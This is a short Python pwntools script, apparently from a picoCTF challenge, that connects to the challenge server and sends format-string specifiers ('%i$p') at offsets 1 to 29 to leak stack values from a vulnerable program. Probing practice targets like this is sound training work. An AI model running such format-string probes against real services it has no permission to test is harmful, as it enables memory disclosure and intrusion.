from pwn import *

for i in range(1, 30):
    p = remote("rhea.picoctf.net", 62182)
    p.recvuntil(b"say?")
    p.sendline(f"%{i}$p".encode())
    response = p.recvline()
    print(f"Offset {i}: {response.strip()}")
    p.close()

